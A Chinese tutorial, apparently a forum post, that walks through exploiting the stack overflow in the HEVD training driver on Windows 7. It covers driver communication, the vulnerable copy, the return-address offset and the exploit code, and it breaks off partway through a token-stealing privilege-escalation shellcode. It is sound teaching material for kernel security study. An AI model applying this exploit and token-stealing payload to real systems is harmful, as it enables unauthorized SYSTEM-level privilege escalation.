> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270049.htm)

> [原创] 内核漏洞学习 [1]-HEVD-StackOverflow

HEVD-StackOverflow
==================

一： 概述
-----

HEVD：漏洞靶场，包含各种 Windows 内核漏洞的驱动程序项目，在 Github 上就可以找到该项目，进行相关的学习

 

[Releases · hacksysteam/HackSysExtremeVulnerableDriver · GitHub](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases)

> 环境准备：
> 
> Windows 7 X86 sp1 虚拟机
> 
> 使用 VirtualKD 和 windbg 双机调试
> 
> HEVD 3.0+KmdManager+DubugView

[](#二：前置知识：)二：前置知识：
-------------------

### [](#（1）栈溢出)（1）栈溢出

网上找的堆栈图，

 

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。

 

发生栈溢出的基本前提是

*   程序必须向栈上写入数据。
    
*   写入的数据大小没有被良好地控制
    

![](https://img-blog.csdnimg.cn/img_convert/c8cb162999b28b16cd7ac2aafb5b94b5.png)

 

例如图中，可以写入大于 buffer 长度的数据，溢出到返回地址

### [](#（2）理解驱动与r3通信)（2）理解驱动与 R3 通信

#### 1. 重要的数据结构

#### **驱动对象**：

Windows 内核采用面向对象的编程方式, 但是使用的却是 C 语言。所以说所谓的 “Windows 内核对象”，并不是一个 C++ 类的对象，而是 Windows 的内核程序员使用 C 语言对面向对象编程方式的一种模拟。首先，Windows 内核认为许多东西都是“对象”，比如一个驱动、一个设备、一个文件，甚至其他的一些东西。“对象” 相当于一个基类。  
在 Windows 启动之后，这些内核对象都在内存中。如果我们在内核中写代码，则可以随意访问它们。每个种类的内核对象都用一个结构体来表示。  
一个驱动对象代表了一个驱动程序，或者说一个内核模块。驱动对象的结构如下

```
kd> dt _Driver_Object
ntdll!_DRIVER_OBJECT
   +0x000 Type             : Int2B  //结构的类型
   +0x002 Size             : Int2B //结构的大小
   +0x004 DeviceObject     : Ptr32 _DEVICE_OBJECT //设备对象，这里实际上是一个设备对象的链表的开始
   +0x008 Flags            : Uint4B
   +0x00c DriverStart      : Ptr32 Void //驱动模块在内核空间中的开始地址
   +0x010 DriverSize       : Uint4B//驱动模块在内核空间中的大小
   +0x014 DriverSection    : Ptr32 Void
   +0x018 DriverExtension  : Ptr32 _DRIVER_EXTENSION //驱动扩展对象
   +0x01c DriverName       : _UNICODE_STRING //驱动名字,这个名字是个字符串结构体
   +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING //驱动服务注册表路径
   +0x028 FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH// 快速IO分发函数
   +0x02c DriverInit       : Ptr32     long //驱动入口点
   +0x030 DriverStartIo    : Ptr32     void
   +0x034 DriverUnload     : Ptr32     void //驱动的卸载函数
   +0x038 MajorFunction    : [28] Ptr32     long  //普通分发函数

```

实际上，如果写一个驱动程序，或者说编写一个内核模块，要在 Windows 中加载，则必须填写这样一个结构（`_Driver_Object`）, 来告诉 Windows 程序提供哪些功能。与编写一个应用程序不同。内核模块并不生成一个进程，只是填写一组回调函数让 Windows 来调用，而且这组回调函数必须符合 Windows 内核规定。  
这一组回调函数包括上面的 “普通分发函数” 和“快速 IO 分发函数”。**这些函数用来处理发送给这个内核模块的请求**。一个内核模块所有的功能都由它们提供给 Windows。

#### **设备对象**

Windows 窗口应用程序开发，窗口是唯一可以接收消息的东西，任何消息都是发送给一个窗口的。而在内核世界里，大部分 “消息” 都以请求 (IRP) 的方式传递。而设备对象（`DEVICE OBJECT`）是唯一可以接收请求的实体，任何一个 “请求”(IRP）都是发送给某个设备对象的。

 

因为我们总是在内核程序中生成一个`DEVICE OBJECT`，而一个内核程序是用一个驱动对象表示的，所以一个设备对象总是属于一个驱动对象。

```
kd> dt _Device_Object
ntdll!_DEVICE_OBJECT
   +0x000 Type             : Int2B
   +0x002 Size             : Uint2B
   +0x004 ReferenceCount   : Int4B //引用计数
   +0x008 DriverObject     : Ptr32 _DRIVER_OBJECT //这个设备所属的驱动对象
   +0x00c NextDevice       : Ptr32 _DEVICE_OBJECT //下一个设备对象，在一个驱动中有n个设备，这些设备用这个指针链接起来（单项链表）
   +0x010 AttachedDevice   : Ptr32 _DEVICE_OBJECT
   +0x014 CurrentIrp       : Ptr32 _IRP
   +0x018 Timer            : Ptr32 _IO_TIMER
   +0x01c Flags            : Uint4B
   +0x020 Characteristics  : Uint4B
   +0x024 Vpb              : Ptr32 _VPB
   +0x028 DeviceExtension  : Ptr32 Void
   +0x02c DeviceType       : Uint4B//设备类型
   +0x030 StackSize        : Char //IRp栈大小
   +0x034 Queue            : +0x05c AlignmentRequirement : Uint4B
   +0x060 DeviceQueue      : _KDEVICE_QUEUE
   +0x074 Dpc              : _KDPC
   +0x094 ActiveThreadCount : Uint4B
   +0x098 SecurityDescriptor : Ptr32 Void
   +0x09c DeviceLock       : _KEVENT
   +0x0ac SectorSize       : Uint2B
   +0x0ae Spare1           : Uint2B
   +0x0b0 DeviceObjectExtension : Ptr32 _DEVOBJ_EXTENSION
   +0x0b4 Reserved         : Ptr32 Void 
```

从`_Device_Object`结构，看出驱动对象与设备对象的联系，驱动对象生成多个设备对象。而 Windows 向设备对象发送请求，这些请求是被驱动对象的**分发函数**所捕获的。当 Windows 内核向一个设备发送一个请求时，驱动对象的分发函数中的某一个会被调用。分发函数原型如下:

```
NTSTATUS MyDispatch(PDEVICE_OBECT deivce，PIRP irp);
//参数device是请求的目标设备，第二个参数irp是请求的指针

```

#### **请求**

大部分请求以 IRP 的形式发送。IRP 也是一个内核数据结构

```
kd> dt _IRP
ntdll!_IRP
   +0x000 Type             : Int2B //类型和大小
   +0x002 Size             : Uint2B
   +0x004 MdlAddress       : Ptr32 _MDL ////内存描述符链表指针。实际上，这里用来描述一个缓冲区。可以想象/一个内核请求一般都需要一个缓冲区(如读硬盘需要有读出缓冲区）
 
   +0x008 Flags            : Uint4B
   +0x00c AssociatedIrp    : +0x010 ThreadListEntry  : _LIST_ENTRY
   +0x018 IoStatus         : _IO_STATUS_BLOCK ///l1O状态。一般请求完成之后的返回值放在这里
   +0x020 RequestorMode    : Char
   +0x021 PendingReturned  : UChar
   +0x022 StackCount       : Char//IRP 栈空间大小
   +0x023 CurrentLocation  : Char // IRP当前栈空间
   +0x024 Cancel           : UChar
   +0x025 CancelIrql       : UChar
   +0x026 ApcEnvironment   : Char
   +0x027 AllocationFlags  : UChar
   +0x028 UserIosb         : Ptr32 _IO_STATUS_BLOCK
   +0x02c UserEvent        : Ptr32 _KEVENT
   +0x030 Overlay          : +0x038 CancelRoutine    : Ptr32     void //用来取消一个未决请求的函数
   +0x03c UserBuffer       : Ptr32 Void
   +0x040 Tail             : 
```

#### **应用与内核的通信**

> **内核方面的编程**
> 
> 1. 生成控制设备
> 
> 2. 控制设备的名字和符号链接
> 
> 3. 控制设备的删除（依次删除符号链接和控制设备）
> 
> 4. 分发函数
> 
> `5.请求的处理`

```
// Sample "Hello World" driver
// creates a HelloDev, that expects one IOCTL
 
#include #define HELLO_DRV_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)   //#define CTL_CODE(DeviceType, Function, Method, Access) (  ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
//这里的CTL CODE是一个宏，是SDK里的头文件提供的。读者要做的是直接利用这个宏来生成一个自己的设备控制请求功能号。CTL_CODE有4个参数，其中第一个参数是设备类型。笔者生成的这种控制设备和任何硬件都没有关系，所以直接定义成未知类型(FILE_DEVICE_UNKNOWN)即可。第二个参数是生成这个功能号的核心数字，这个数字直接用来和其他参数“合成”功能号。OxO~Ox7ff已经被微软预留，所以笔者只能使用大于0x7ff的数字。同时，这个数字不能大于0xfmf。如果要定义超过一个的功能号，那么不同的功能号就靠这个数字进行区分。第三个参数METHOD_BUFFERED是说用缓冲方式2。用缓冲方式的话，输入/输出缓冲会在用户和内核之间拷贝。这是比较简单和安全的一种方式。最后一个参数是这个操作需要的权限。当笔者需要将数据发送到设备时，相当于往设备上写入数据，所以标志为拥有写数据权限（FILE_WRITE_DATA)。
 
 
#define DOS_DEV_NAME L"\\DosDevices\\HelloDev"
#define DEV_NAME L"\\Device\\HelloDev"
 
/// /// IRP Not Implemented Handler
/// 
/// The pointer to DEVICE_OBJECT
/// The pointer to IRP
/// NTSTATUS、
 
 
/*
以下是分发函数
 
分发函数是一组用来处理发送给设备对象（当然也包括控制设备）的请求的函数。这些数由内核驱动的开发者编写，以便处理这些请求并返回给Windows。分发函数是设置在驱动对象（Driver Object)上的。也就是说，每个驱动都有一组自己的分发函数。Windows的IO管理器在收到请求时，会根据请求发送的目标，也就是一个设备对象，来调用这个设备对象所从的驱动对象上对应的分发函数。
 
不同的分发函数处理不同的请求
打开（Create'):在试图访问一个设备对象之前，必须先用打开请求“打开”它。只有得到成功的返回，才可以发送其他的请求。
关闭（Close):在结束访问一个设备对象之后，发送关闭请求将它关闭。关闭之后，就必须再次打开才能访问。
设备控制（Device Control):设备控制请求是一种既可以用来输入（从应用到内核),又可以用来输出（从内核到应用）的请求。
NTSTATUS cwkDispatch(IN_PDEVICE_OB3ECT dev,IN PIRp irp)
 
其中的dev就是请求要发送给的目标对象;irp则是代表请求内容的数据结构的指针。无论如何，分发函数必须首先设置给驱动对象，这个工作一般在 DriverEntry中完成。
 
------------------------------------------------------------------------------------------------------------------
*/
 
 
NTSTATUS IrpNotImplementedHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
    Irp->IoStatus.Information = 0;
    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
 
    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();
 
    // Complete the request
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
 
    return STATUS_NOT_SUPPORTED;
}
 
/// /// IRP Create Close Handler
/// 
/// The pointer to DEVICE_OBJECT
/// The pointer to IRP
/// NTSTATUS
NTSTATUS IrpCreateCloseHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
    Irp->IoStatus.Information = 0;
    Irp->IoStatus.Status = STATUS_SUCCESS;
 
    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();
 
    // Complete the request
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
 
    return STATUS_SUCCESS;
}
 
/// /// IRP Unload Handler
/// 
/// The pointer to DEVICE_OBJECT
/// NTSTATUS
VOID IrpUnloadHandler(IN PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING DosDeviceName = { 0 };
 
    PAGED_CODE();
 
    RtlInitUnicodeString(&DosDeviceName, DOS_DEV_NAME);
 
    // Delete the symbolic link
    IoDeleteSymbolicLink(&DosDeviceName);
 
    // Delete the device
    IoDeleteDevice(DriverObject->DeviceObject);
 
    DbgPrint("[!] Hello Driver Unloaded\n");
}
 
/// /// IRP Device IoCtl Handler
/// 
/// The pointer to DEVICE_OBJECT
/// The pointer to IRP
/// NTSTATUS
NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
    ULONG IoControlCode = 0;
    PIO_STACK_LOCATION IrpSp = NULL;
    NTSTATUS Status = STATUS_NOT_SUPPORTED;
 
    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();
 
    IrpSp = IoGetCurrentIrpStackLocation(Irp);
    IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;
 //根据不同的控制码作出不同的处理
    if (IrpSp) {
        switch (IoControlCode) {
        case HELLO_DRV_IOCTL:
            DbgPrint("[< HelloDriver >] Hello from the Driver!\n");
            break;
        default:
            DbgPrint("[-] Invalid IOCTL Code: 0x%X\n", IoControlCode);
            Status = STATUS_INVALID_DEVICE_REQUEST;
            break;
        }
    }
 
    Irp->IoStatus.Status = Status;//3环的GetLastError得到的就是这个值
    Irp->IoStatus.Information = 0;//返回数据的字节数  没有写0
 
    // Complete the request
    IoCompleteRequest(Irp, IO_NO_INCREMENT);//用于结束这个请求
 
    return Status;
}
-------------------------------------------------------------------------------------------------------------------
以上都是分发函数
 
-------------------------------------------------------------------------------------------------------------------
 
 
 // 驱动入口函数
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
    UINT32 i = 0;
    PDEVICE_OBJECT DeviceObject = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL; //绝大多数内核函数都会有一个返回值，类型为NTSTATUS。该类型本质就是一个LONG
    UNICODE_STRING DeviceName, DosDeviceName = { 0 };
 
    UNREFERENCED_PARAMETER(RegistryPath);
    PAGED_CODE();
 
    RtlInitUnicodeString(&DeviceName, DEV_NAME);//初始化unicode字符串，为其赋值。不会申请内存。
    RtlInitUnicodeString(&DosDeviceName, DOS_DEV_NAME);
 
    DbgPrint("[*] In DriverEntry\n");//驱动的打印函数
 
    //1.创建设备，指定设备的名字
    Status = IoCreateDevice(DriverObject,
        0,
        &DeviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &DeviceObject);
 /*NTSTATUS
IoCreateDevice(
IN PDRIVER_OBJECT DriverObject,
IN ULONG DeviceExtensionsize,设备扩展的大小
IN PUNICODE_STRING DeviceName OPTIONAL,设备名，以便应用程序打开
IN DEVICE_TYPE DeviceType, 设备类型
IN ULONG DeviceCharacteristics, 设备属性
IN BOOLEAN Exclusive, 表示是否是一个独占设备
OUT PDEVICE_OBJECT *DeviceObject); 用来返回结果，如果函数执行成功（返回值为STATUS_SUCCESS），*DeviceObject就是生成的设备对象对的指针
生成设备对象DriverObject，设备对象可以在内核中暴露出来给应用层，应用层可以像操作文件一样操作它。这
 
*/
 
 
    if (!NT_SUCCESS(Status)) {
        if (DeviceObject) {
            // Delete the device
            IoDeleteDevice(DeviceObject);
        }
 
        DbgPrint("[-] Error Initializing HelloDriver\n");
        return Status;
    }
/*
分发函数必须首先设置给驱动对象
注意，下面的片段中将所有的分发函数（实际上MajorFunction是一个函数指针数组，保存所有分发函数的指针>都设置成同一个函数，这是一种简单的处理方案。
 
 
*/
    // Assign the IRP handlers
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        // Disable the Compiler Warning: 28169
#pragma warning(push)
#pragma warning(disable : 28169)
        DriverObject->MajorFunction[i] = IrpNotImplementedHandler;
#pragma warning(pop)
    }
 // 5.请求的处理
 
    // Assign the IRP handlers for Create, Close and Device Control
    /*
    在用户层，我们每次调用CreateFile、OpenFIle、DeleteFile、CloseHandle等API时，都会向0环发送一个消息，这个消息成为IRP数据包。这些API称为设备操作API。如：当调用CreateFile时，会向内核层发送一个名为IRP_MJ_CREATE的打开设备的IRP消息。其他常用IRP类型如下：
 
CreateFile        -》    IRP_MJ_CREATE
ReadFile        -》    IRP_MJ_READ
WriteFile        -》    IRP_MJ_WRITE
CloseHandle        -》    IRP_MJ_CLOSE
DeviceControl    -》    IRP_MJ_DEVICE_CONTROL        //此API比上面的API更加灵活方便，因此内核编程中常使用该API进行消息的传递
    */
 
 
    DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpCreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;
 
    // Assign the driver Unload routine
    DriverObject->DriverUnload = IrpUnloadHandler;//为驱动指定卸载函数
 
    // Set the flags
    /*
    设置数据交互方式
pDeviceObj->Flags
//缓冲区方式读写（DO_BUFFERED_IO）：将3环缓冲区内的数据复制一份到0环的缓冲区。  方便，但性能不好。
//直接方式读写（DO_DIRECT_IO）:首先将3环缓冲区锁住，然后在将对应的物理地址映射一份0环的线性地址。适合大量数据传输。两个线性地址对应同一个物理地址。
//其它方式读写（不设置值）：0环直接读取3环的线性地址，不建议。当进程切换,CR3改变，会读取到其他进程的内存数据。
pDeviceObj->Flags &= DO_DEVICE_INITIALIZING;
//将DO_DEVICE_INITIALIZING初始化标志位清空，如果不清空这个位，那么3环可能无法打开设备。
    */
    DeviceObject->Flags |= DO_DIRECT_IO;
    DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
 
    // 2.创建符号链接
    //控制设备需要名字，暴露出来，供其他程序打开与之通信
   /*
  设备的名字可以在调用IoCreateDevice或IoCreateDeviceSecure时指定。此外，应用层是无法直接通过设备的名字来打开对象的，为此必须要建立一个暴露给应用层的符号链接。符号链接就是记录一个字符串对应到另一个字符串的一种简单结构。生成符号链接的函数是:
 NTSTATUS
IoCreatesymbolicLink(
IN PUNICODE_STRING symbolicLinkName, 符号链接，名
IN PUNICODE_STRING DeviceName  设备名
);
 
   */
//IoCreateSymbolicLink  3.控制设备的删除，依次删除符号链接和控制设备
    Status = IoCreateSymbolicLink(&DosDeviceName, &DeviceName);
 
    // Show the banner
    DbgPrint("[!] HelloDriver Loaded\n");
 
    return Status;
} 
```

![](https://img-blog.csdnimg.cn/img_convert/f895eccabc63aead15dd12b5bda0690f.png)

> **应用层面的编程**
> 
> 1. 在应用程序中打开与关闭设备
> 
> 2. 设备控制请求

```
#include #include #include //这个宏用于组装IRP控制码，其中用户自定义的控制码从0x800开始。
#define io_code1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define io_code2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)
int main()
{
    CHAR* deviceName = (CHAR*)"\\\\.\\MyDevice1";
    //1.在应用程序中打开与关闭设备
    HANDLE deviceHandle = CreateFileA(deviceName,GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ| FILE_SHARE_WRITE,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,NULL);
    DWORD str = 100;
    DWORD back = 0;
    DWORD Length = 0;    //实际返回的数据长度
    //2.设备控制请求
    DeviceIoControl(deviveHandle, io_code1, &str,0x4,&back,0x4,&length,NULL);
    printf("back = %d\r\n", Length);
    str = 200;
    DeviceIoControl(deviceHandle, io_code2, &str, 0x4, &back, 0x4, &Length, NULL);
    printf("back = %d\r\n", Length);
    getchar();
    CloseHandle(deviceHandle);
    return 0;
} 
```

```
BOOL DeviceIoControl (
HANDLE hDevice, // 设备句柄
DWORD dwIoControlCode, // IOCTL请求操作代码
LPVOID lpInBuffer, // 输入缓冲区地址
DWORD nInBufferSize, // 输入缓冲区大小
LPVOID lpOutBuffer, // 输出缓冲区地址
DWORD nOutBufferSize, // 输出缓冲区大小
LPDWORD lpBytesReturned, // 存放返回字节数的指针
LPOVERLAPPED lpOverlapped // 用于同步操作的Overlapped结构体指针
);

```

总结：通过用户层与内核层的通信，可以让用户程序在需要时调用驱动的特定功能. 驱动通信类似于 Windows 消息机制，在内核中，消息被封装在 IRP 结构体中（I/O Request Packae ：IO 请求包），设备对象接受 IRP 实现用户程序与驱动程序的通信。

 

**通过 DeviceIoControl 函数来使应用程序与驱动程序通信**

 

这种通信方式，就是驱动程序和应用程序自定义一种 IO 控制码，然后应用程序调用 DeviceIoControl 函数，DeviceIoControl 函数会产生此 IRPIRP_MJ_DEVICE_CONTROL，系统就调用相应的处理 IRP_MJ_DEVICE_CONTROL 的分发函数，在分发函数中判断，是自定义的控制码你就进行相应的处理。

 

[编写 Hello World Windows 驱动程序 (KMDF) - Windows drivers | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver)

 

[Windows 驱动程序示例 - Windows drivers | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/samples/)

 

（可以借助这个 HEVD 项目更加加深对驱动通信的理解）

[](#三：漏洞点分析)三：漏洞点分析
-------------------

漏洞原理：栈溢出漏洞，使用过程中使用危险的函数，没有对

 

（1）加载驱动

 

安装驱动程序，使用 kmdManager 加载驱动程序，DebugView 检测内核，可以看到加载驱动程序成功。

 

![](https://img-blog.csdnimg.cn/img_convert/5edf823fbae67c4d8ca0d4f6c2a20c11.png)

 

windbg:

 

![](https://img-blog.csdnimg.cn/img_convert/c03497a167be87f6fa54e6665fba402c.png)

```
lm  查看所有已加载模块
lm m H* 设置过滤，查找HEVD模块
lm m HEVD

```

![](https://img-blog.csdnimg.cn/img_convert/6eb6f30640039766a5613027c908b92c.png)

 

（2）分析漏洞点

 

对 BufferOverflowStack.c 源码进行分析，漏洞函数 TriggerBufferOverflowStack，存在明显的栈溢出漏洞，RtlCopyMemory 函数没有对 KernelBuffer 大小进行验证，直接将 size 大小的 userbuffer 传入缓冲区，没有进行大小的限制，(例如安全版本的 sizeof(KernelBuffer)), 因此造成栈溢出，攻击返回地址，使之指向构造的 payload。

```
#define BUFFER_SIZE 512  
//sizeof(KernelBuffer) 0x800
 
TriggerBufferOverflowStack(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
 
    PAGED_CODE();
 
    __try
    {
 
 
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));
 
        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
 
#ifdef SECURE
 
 
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));//  安全版本
#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");
 
 
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);// 不安全版本：存在栈溢出漏洞，未对传进KernelBuffer大小进行限制。
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}

```

[](#四：漏洞利用)四：漏洞利用
-----------------

利用驱动与 R3 通信，能够直接读取 R3 地址，构造 exp

 

1. 获取栈中 KernelBuffer 到返回地址的偏移

 

ida 中打开 HEVD.sys

 

![](https://img-blog.csdnimg.cn/img_convert/e9028926c0986bd0a6d455d97b8b4018.png)

 

KernelBuffer 距离 ebp 81Ch，想覆盖到返回地址需要 81C+4+4 =824h

 

也可以使用 windbg 结合断点，在 TriggerBufferOverflowStack，RtlCopyMemory 函数处下断点，判断偏移。

 

2. 构造 exp（官方 exp）

```
DWORD WINAPI StackOverflowThread(LPVOID Parameter) {
HANDLE hFile = NULL;
    ULONG BytesReturned;
    PVOID MemoryAddress = NULL;
    PULONG UserModeBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;//设备名称
    PVOID EopPayload = &TokenStealingPayloadWin7;//构造的payload地址
    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE) * sizeof(ULONG);
 
    __try {
        //获得设备句柄
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);
 
        hFile = GetDeviceHandle(FileName);
 
        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }
 
        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");
 
        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");
 
        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
                                           HEAP_ZERO_MEMORY,
                                           UserModeBufferSize);
 
        if (!UserModeBuffer) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", UserModeBuffer);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", UserModeBufferSize);
        }
 
        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");
 
        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);//'A'填充
 
        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - sizeof(ULONG));
        //UserModeBuffer最后四个字节(sizeof(ULONG))的地址，写入payload地址，覆盖栈中原本返回地址。
        *(PULONG)MemoryAddress = (ULONG)EopPayload;
 
        DEBUG_INFO("\t\t\t[+] RET Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] RET Address: 0x%p\n", MemoryAddress);
 
        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);
 
        DEBUG_MESSAGE("\t[+] Triggering Kernel Stack Overflow\n");
 
        OutputDebugString("****************Kernel Mode****************\n");
        //R3调用DeviceIoControl函数，产生此IRP_MJ_DEVICE_CONTROL，HACKSYS_EVD_IOCTL_STACK_OVERFLOW（自定义的控制码），
        //HACKSYS_EVD_IOCTL_STACK_OVERFLOW=
        //对应的派遣函数BufferOverflowStackIoctlHandler,
        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
                        (LPVOID)UserModeBuffer,
                        (DWORD)UserModeBufferSize,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);
 
        OutputDebugString("****************Kernel Mode****************\n");
 
        HeapFree(GetProcessHeap(), 0, (LPVOID)UserModeBuffer);
 
        UserModeBuffer = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
 
    return EXIT_SUCCESS;
}

```

HACKSYS_EVD_IOCTL_STACK_OVERFLOW 控制码对应的派遣函数 BufferOverflowStackIoctlHandler

```
DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateCloseHandler;
DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpCreateCloseHandler;
DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;

```

```
IrpDeviceIoCtlHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    ULONG IoControlCode = 0;
    PIO_STACK_LOCATION IrpSp = NULL;
    NTSTATUS Status = STATUS_NOT_SUPPORTED;
 
    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();
 
    IrpSp = IoGetCurrentIrpStackLocation(Irp);
    IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;
 
    if (IrpSp)
    {
        switch (IoControlCode)
        {
        case HEVD_IOCTL_BUFFER_OVERFLOW_STACK:
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
            Status = BufferOverflowStackIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
            break;
 
        }
    }

```

BufferOverflowStackIoctlHandler 函数调用 TriggerBufferOverflowStack 触发漏洞函数

```
NTSTATUS BufferOverflowStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
 
UNREFERENCED_PARAMETER(Irp);
PAGED_CODE();
//首先将指定的Method参数设置为METHOD_NEITHER。
 
//往驱动中Input数据：通过I/O堆栈的Parameters.DeviceIoControl.Type3InputBuffer得到DeviceIoControl提供的输入缓冲区地址，Parameters.DeviceIoControl.InputBufferLength得到其长度。
 
UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
 
if (UserBuffer)
{
    Status = TriggerBufferOverflowStack(UserBuffer, Size);
}
 
return Status;
}

```

payload 功能：遍历进程，得到系统进程的 token，把当前进程的 token 替换，达到提权目的。

 

相关内核结构体：

 

在内核模式下，fs:[0] 指向 KPCR 结构体

```
_KPCR
+0x120 PrcbData         : _KPRCB
_KPRCB
+0x004 CurrentThread    : Ptr32 _KTHREAD，_KTHREAD指针，这个指针指向_KTHREAD结构体
_KTHREAD
+0x040 ApcState         : _KAPC_STATE
_KAPC_STATE
+0x010 Process          : Ptr32 _KPROCESS,_KPROCESS指针，这个指针指向EPROCESS结构体
_EPROCESS
   +0x0b4 UniqueProcessId  : Ptr32 Void,当前进程ID，系统进程ID=0x04
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY，双向链表，指向下一个进程的ActiveProcessLinks结构体处，通过这个链表我们可以遍历所有进程，以寻找我们需要的进程
   +0x0f8 Token            : _EX_FAST_REF，描述了该进程的安全上下文，同时包含了进程账户相关的身份以及权限

```

payload：

```
__asm {
       pushad                               ; 保存寄存器
 
 
       xor eax, eax                         ;eax置0
       mov eax, fs:[eax + KTHREAD_OFFSET]   ; 获得当前线程的_KTHREAD结构，KTHREAD_OFFSET=0x124
                                            ; FS:[0x124] 是 _KTHREAD结构
 
       mov eax, [eax + EPROCESS_OFFSET]     ;  找到_EPROCESS结构， nt!_KTHREAD.ApcState.Process，EPROCESS_OFFSET 0x50
 
 
       mov ecx, eax                         ; ecx ，当前进程Eprocess结构体
 
       mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
 
       SearchSystemPID:
           mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink，FLINK_OFFSET=0xb8
